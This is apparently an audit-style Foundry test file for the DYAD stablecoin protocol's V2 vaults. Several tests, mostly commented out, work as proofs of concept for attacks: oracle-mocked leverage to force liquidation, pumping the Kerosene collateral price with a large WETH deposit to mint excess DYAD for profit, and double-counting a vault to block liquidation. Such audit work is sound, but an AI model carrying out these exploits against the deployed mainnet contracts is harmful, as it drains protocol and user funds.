// SPDX-License-Identifier: MIT
pragma solidity =0.8.17;

import "forge-std/console.sol";
import "forge-std/Test.sol";
import { VaultManager } from "../../src/core/VaultManager.sol";
import "../../script/deploy/Deploy.V2.s.sol";
import { Licenser } from "../../src/core/Licenser.sol";
import { Parameters } from "../../src/params/Parameters.sol";

interface IUniswapRouterV2V3 {
  function swapExactETHForTokens(
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external payable returns (uint256[] memory amounts);
  function swapExactTokensForTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to
  ) external payable returns (uint256 amountOut);

  function exactInputSingle(ExactInputSingleParams calldata params)
    external
    payable
    returns (uint256 amountOut);

  struct ExactInputSingleParams {
    address tokenIn;
    address tokenOut;
    uint24 fee;
    address recipient;
    uint256 amountIn;
    uint256 amountOutMinimum;
    uint160 sqrtPriceLimitX96;
  }
}

contract V2Test is Test, Parameters {
  Contracts contracts;
  IUniswapRouterV2V3 uniswapV2Router =
    IUniswapRouterV2V3(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
  IUniswapRouterV2V3 uniswapV3Router =
    IUniswapRouterV2V3(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);

  function setUp() public {
    contracts = new DeployV2().run();
    vm.startPrank(MAINNET_OWNER);
    //include boundedKerosineVault
    contracts.vaultLicenser.add(address(contracts.boundedKerosineVault));
    // Add vaultManagerV2 to v1 licenser so it can mint DYAD
    Licenser(MAINNET_VAULT_MANAGER_LICENSER).add(address(contracts.vaultManager));
    vm.stopPrank();
  }

  function testLeverage() public {
    address user = address(0x11111);
    vm.startPrank(user);
    //buying new NFT ID
    deal(user, 10 ether);
    uint256 id = DNft(MAINNET_DNFT).mintNft{ value: 1 ether }(user); //@refunfed

    VaultManager vaultManagerV1 = VaultManager(MAINNET_VAULT_MANAGER);
    ERC20(MAINNET_WETH).approve(address(vaultManagerV1), type(uint256).max);
    vaultManagerV1.add(id, MAINNET_WETH_VAULT);

    deal(address(MAINNET_WETH), user, 10 ether);

    //try max loan
    for (uint256 i = 0; i < 11; i++) {
      //2.85 times the original value
      console.log("Loop ", i);
      swapDYADToWETH(user);
      vaultManagerV1.deposit(id, MAINNET_WETH_VAULT, ERC20(MAINNET_WETH).balanceOf(user));
      uint256 vaultUSDValue = vaultManagerV1.getTotalUsdValue(id);
      console.log("vaultUSDValue %e", vaultUSDValue);
      uint256 mintedDyad = Dyad(MAINNET_DYAD).mintedDyad(address(vaultManagerV1), id);
      uint256 maxBorrow = (vaultUSDValue * 1e18 / 1.5e18) - mintedDyad;
      // console.log("maxBorrow %e", maxBorrow);
      vaultManagerV1.mintDyad(id, maxBorrow, user);
      // console.log("cr: %e", vaultManagerV1.collatRatio(id));
    }
    //10 ETH = 32363 $
    //leverage to 92230$
    //mockCall chainlink oracle so it return different price
    console.log("------------------");
    Vault wethVault = Vault(MAINNET_WETH_VAULT);
    console.log("eth Price %e", wethVault.assetPrice());
    console.log("vaultUSDValue %e", vaultManagerV1.getTotalUsdValue(id));
    console.log("cr: %e", vaultManagerV1.collatRatio(id));

    uint256 debt = Dyad(MAINNET_DYAD).mintedDyad(address(vaultManagerV1), id);
    console.log("debt %e", debt);
    IAggregatorV3 oracle = IAggregatorV3(MAINNET_WETH_ORACLE);
    (
      ,
      int256 answer, //@3161.57477019
      ,
      uint256 updatedAt,
    ) = oracle.latestRoundData();
    answer = answer * 0.99e8 / 1e8;
    vm.mockCall(
      address(MAINNET_WETH_ORACLE),
      abi.encodeWithSelector(0xfeaf968c),
      abi.encode(uint80(0), answer, uint256(0), uint256(updatedAt), uint256(0))
    );

    console.log("new price %e", wethVault.assetPrice());
    console.log("vaultUSDValue %e", vaultManagerV1.getTotalUsdValue(id));
    console.log("cr: %e", vaultManagerV1.collatRatio(id));
    // cr < 1.5 now it is possible to liquidate

    vm.stopPrank();
  }

  function swapDYADToWETH(address user) internal returns (uint256) {
    //uniswapv3 swap DYAD -> USDC -> WETH
    ERC20(MAINNET_DYAD).approve(address(uniswapV3Router), type(uint256).max);
    ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48).approve(
      address(uniswapV3Router), type(uint256).max
    );
    if (ERC20(MAINNET_DYAD).balanceOf(user) == 0) {
      return 0;
    }

    uint256 amountOut = uniswapV3Router.exactInputSingle(
      IUniswapRouterV2V3.ExactInputSingleParams({
        tokenIn: MAINNET_DYAD,
        tokenOut: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, //usdc
        fee: 500,
        recipient: user,
        amountIn: ERC20(MAINNET_DYAD).balanceOf(user),
        amountOutMinimum: 1,
        sqrtPriceLimitX96: 0
      })
    );
    // console.log("USDC received %e", amountOut);
    uint256 wethOut = uniswapV3Router.exactInputSingle(
      IUniswapRouterV2V3.ExactInputSingleParams({
        tokenIn: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
        tokenOut: MAINNET_WETH,
        fee: 500,
        recipient: user,
        amountIn: amountOut,
        amountOutMinimum: 1,
        sqrtPriceLimitX96: 0
      })
    );
    // console.log("WETH received %e", wethOut);
    return wethOut;
  }

  fallback() external payable {
    console.log("callback");
  }

  receive() external payable {
    console.log("receive");
  }

  // function testKeroseneSlippage() public {
  //   vm.startPrank(MAINNET_OWNER);
  //   //include 2 V1 vaults into keroseneManager so it calcualte TVL correctly.
  //   contracts.kerosineManager.add(address(MAINNET_WETH_VAULT));
  //   contracts.kerosineManager.add(address(MAINNET_WSTETH_VAULT));
  //   vm.stopPrank();
  //   address user = address(0x11111);
  //   vm.startPrank(user);

  //   //buying new NFT ID
  //   deal(user, 10 ether);
  //   uint256 id = DNft(MAINNET_DNFT).mintNft{ value: 1 ether }(user); //@refunfed
  //   uint256 id2 = DNft(MAINNET_DNFT).mintNft{ value: 1 ether }(user); //@refunfed

  //   uint256 startingEthBalance = address(user).balance;

  //   //setup vault
  //   VaultManagerV2 vaultManagerV2 = VaultManagerV2(contracts.vaultManager);
  //   ERC20(MAINNET_WETH).approve(address(vaultManagerV2), type(uint256).max);

  //   vaultManagerV2.add(id, address(contracts.ethVault));
  //   vaultManagerV2.add(id2, address(contracts.ethVault));
  //   vaultManagerV2.add(id, address(contracts.wstEth));
  //   vaultManagerV2.add(id, address(contracts.unboundedKerosineVault));
  //   // console.log("denominator %e", contracts.kerosineDenominator.denominator()); //
  //   console.log("ethVaultPrice %e", contracts.ethVault.assetPrice()); //3.2472e11
  //   console.log("wstEthPrice %e", contracts.wstEth.assetPrice()); //3.79132877826e11
  //     // we test use kerosine to make print unfair DYAD price
  //     // KEROSINE price is fixed when print. then it drop value when minted DYAD
  //     //using all available ethereum to to buy all possible KEROSENE on uniswapv2.
  //   {
  //     address[] memory path = new address[](2);
  //     path[0] = MAINNET_WETH;
  //     path[1] = MAINNET_KEROSENE;

  //     console.log("swap %e ETH for KEROSENE", startingEthBalance);
  //     uniswapV2Router.swapExactETHForTokens{ value: address(user).balance }(
  //       0, path, address(user), block.timestamp + 100
  //     );
  //     uint256 keroseneBalance = ERC20(MAINNET_KEROSENE).balanceOf(user);
  //     console.log("KEROSENE receive %e", keroseneBalance);
  //     console.log(
  //       "KEROSENE USD price in UniswapV2: %e ",
  //       startingEthBalance * contracts.ethVault.assetPrice() * 1e18 / keroseneBalance / 1e8
  //     );

  //     ERC20(MAINNET_KEROSENE).approve(address(vaultManagerV2), type(uint256).max);
  //     vaultManagerV2.deposit(id, address(contracts.unboundedKerosineVault), keroseneBalance);
  //   }

  //   //get 8.6e23 = 860,000 KEROSENE
  //   //total KERO is 50M
  //   // 1M $ in collateral

  //   //deposit huge amount of WETH as collateral and see how priced changed
  //   console.log("-------BEFORE DEPOSIT--------");
  //   console.log("KEROSENE vault price: %e", contracts.unboundedKerosineVault.assetPrice());
  //   console.log("DNFT only KEROSENE total USD value: %e", vaultManagerV2.getTotalUsdValue(id));
  //   // KEROSINE price not depend on KERO deposit into vault. Only WETH and wstETH affect price.
  //   // the more WETH deposit into vault, the more KEROSINE price increase. the more DYAD can be printed.
  //   // if user deposit 1 million $ WETH deposit. KEROSINE price worth double uniswap price.

  //   //TVL is $1,696,647 , 500 ether ~$1,500,000

  //   //deposit 500 WETH will barely make a profit
  //   // deal(MAINNET_WETH, user, 500 ether);

  //   //deposit 2500 WETH to demonstrate flashloan profit
  //   deal(MAINNET_WETH, user, 2500 ether);

  //   ERC20(MAINNET_WETH).approve(address(vaultManagerV2), type(uint256).max);
  //   //deposit 100 WETH into vault ID 2 to prevent mixing with vault ID 1
  //   vaultManagerV2.deposit(id2, address(contracts.ethVault), ERC20(MAINNET_WETH).balanceOf(user));

  //   console.log("-------AFTER WETH DEPOSIT--------");
  //   console.log("KEROSENE vault price: %e", contracts.unboundedKerosineVault.assetPrice());
  //   console.log("DNFT only KEROSENE total USD value: %e", vaultManagerV2.getTotalUsdValue(id));

  //   //$KEROSENE price got pumped up
  //   //collateral with KEROSENE only also rise too

  //   // try mint DYAD to maximum collateral value
  //   // cannot mint DYAD 66.67% collateral because post mint also have collateral ratio check too
  //   // post mint also affect collateral ratio.
  //   console.log("-------MINTING DYAD--------");
  //   uint256 maxMint = vaultManagerV2.getTotalUsdValue(id) * 1e18 / 1.55e18;
  //   console.log("try minting %e DYAD", maxMint);
  //   vaultManagerV2.mintDyad(id, maxMint, user);
  //   console.log("after mint collateral ratio %e", vaultManagerV2.collatRatio(id));
  //   // vaultManagerV2.mintDyad(id2, vaultManagerV2.getTotalUsdValue(id2) * 1e18 / 1.51e18, address(this));
  //   // console.log("after mint collateral ratio %e", vaultManagerV2.collatRatio(id2));

  //   console.log("-------AFTER MINTING--------");
  //   console.log("KEROSENE vault price: %e", contracts.unboundedKerosineVault.assetPrice());
  //   console.log("DNFT only KEROSENE total USD value: %e", vaultManagerV2.getTotalUsdValue(id));
  //   console.log("DYAD balance: %e", ERC20(MAINNET_DYAD).balanceOf(user));
  //   console.log(
  //     "loan %e WETH worth %e USD for %e DYAD",
  //     startingEthBalance,
  //     startingEthBalance * contracts.ethVault.assetPrice() / 1e8,
  //     ERC20(MAINNET_DYAD).balanceOf(user)
  //   );
  //   console.log("profit: %e", ERC20(MAINNET_DYAD).balanceOf(user) - startingEthBalance * contracts.ethVault.assetPrice() / 1e8);

  //   vm.stopPrank();
  // }

  // function testBorrowTwiceDeposit() public {
  //   address user = address(0x11111);
  //   vm.startPrank(user);
  //   deal(user, 100 ether);
  //   uint256 id = DNft(MAINNET_DNFT).mintNft{ value: 10 ether }(user); //@refunfed
  //   //setup vault
  //   VaultManagerV2 vaultManagerV2 = VaultManagerV2(contracts.vaultManager);
  //   ERC20(MAINNET_WETH).approve(address(vaultManagerV2), type(uint256).max);
  //   vaultManagerV2.add(id, address(contracts.ethVault));
  //   //deposit
  //   deal(MAINNET_WETH, user, 10 ether);
  //   vaultManagerV2.deposit(id, address(contracts.ethVault), 10 ether);

  //   //10 ETH with  3100$ price = 31000$ total TVL
  //   console.log("totalTVL %e", vaultManagerV2.getTotalUsdValue(id));
  //   // borrow 6.66 ETH worth of DYAD. //max borrow = totalTVL / 1.5
  //   uint256 maxBorrow = (vaultManagerV2.getTotalUsdValue(id) * 1e18 / 1.5e18) - 1;
  //   console.log("maxBorrow DYAD %e", maxBorrow);
  //   vaultManagerV2.mintDyad(id, maxBorrow, user);
  //   console.log("collatRatio %e", vaultManagerV2.collatRatio(id));

  //   console.log("add kerosene vault");
  //   //after add kerosene vault. TVL now double.
  //   vaultManagerV2.addKerosene(id, address(contracts.ethVault));
  //   console.log("totalTVL %e", vaultManagerV2.getTotalUsdValue(id));

  //   //liquidation now impossible due to collatRatio just become double while debt stay the same.
  //   // collateral ratio is <100%. user profit from borrowing
  //   console.log("collatRatio %e", vaultManagerV2.collatRatio(id));
  //   vm.stopPrank();
  // }

  // function testGasCostDeposit() public {
  //   address user = address(0x11111);
  //   vm.startPrank(user);
  //   //buying new NFT ID
  //   deal(user, 100 ether);
  //   uint256 id = DNft(MAINNET_DNFT).mintNft{ value: 10 ether }(user); //@refunfed

  //   //setup vault
  //   VaultManagerV2 vaultManagerV2 = VaultManagerV2(contracts.vaultManager);
  //   vaultManagerV2.add(id, address(contracts.ethVault));

  //   ERC20(MAINNET_WETH).approve(address(vaultManagerV2), type(uint256).max);
  //   deal(MAINNET_WETH, user, 10 ether);
  //   vaultManagerV2.deposit(id, address(contracts.ethVault), 10 ether);

  //   VaultTest vaultTest = new VaultTest();
  //   uint gas_before = gasleft();
  //   vaultManagerV2.deposit(id, address(vaultTest), 0);
  //   uint gas_after = gasleft();
  //   console.log("gas cost %e", gas_before - gas_after);
  //   vm.stopPrank();
  // }

  // function testDenominator() public {
  //   address user = address(0x11111);
  //   vm.startPrank(user);

  //   //buying new NFT ID
  //   deal(user, 100 ether);
  //   uint256 id = DNft(MAINNET_DNFT).mintNft{ value: 10 ether }(user); //@refunfed

  //   //setup vault
  //   VaultManagerV2 vaultManagerV2 = VaultManagerV2(contracts.vaultManager);
  //   ERC20(MAINNET_WETH).approve(address(vaultManagerV2), type(uint256).max);

  //   vaultManagerV2.add(id, address(contracts.ethVault));
  //   vaultManagerV2.add(id, address(contracts.wstEth));

  //   //388 WETH inside V1 vault. so new vault must have 400 ETH before it can be run.
  //   uint256 wethPrice = (contracts.ethVault.assetPrice() * 1e18) / 1e8;
  //   uint256 totalDYAD = Dyad(MAINNET_DYAD).totalSupply();
  //   uint256 minimumETH = (totalDYAD / wethPrice) * 1e18;
  //   console.log("minimum ETH for Kerosine vault to work %e", minimumETH);

  //   deal(MAINNET_WETH, user, minimumETH + 10 ether);
  //   uint256 depositAmount = minimumETH + 1e1;
  //   vaultManagerV2.deposit(id, address(contracts.ethVault), depositAmount);
  //   //197 ETH with  3100$ price = 610700$ total TVL
  //   console.log("totalTVL %e", vaultManagerV2.getTotalUsdValue(id));
  //   vaultManagerV2.addKerosene(id, address(contracts.ethVault));
  //   vaultManagerV2.addKerosene(id, address(contracts.wstEth));
  //   console.log("totalTVL %e", vaultManagerV2.getTotalUsdValue(id));
  //   vm.roll(block.number + 1);
  //   // try withdrawal will just fail
  //   vaultManagerV2.withdraw(id, address(contracts.ethVault), 0,user);

  //   console.log("collatRatio %e", vaultManagerV2.collatRatio(id));
  //   console.log("denominator %e", contracts.kerosineDenominator.denominator());
  //   console.log("ethVaultPrice %e", contracts.ethVault.assetPrice());
  //   console.log("wstEthPrice %e", contracts.wstEth.assetPrice());

  //   console.log("unboundedAssetPrice %e", contracts.unboundedKerosineVault.assetPrice());
  //   console.log("boundedAssetPrice %e", contracts.boundedKerosineVault.assetPrice());

  //   vm.stopPrank();
  // }
}

contract VaultTest {
  function asset() external view returns (address) {
    return address(this);
  }

  function transferFrom(address from, address to, uint256 value) external returns (bool) {
    return true;
  }

  function deposit(uint256 id, uint256 amount) external { }
}
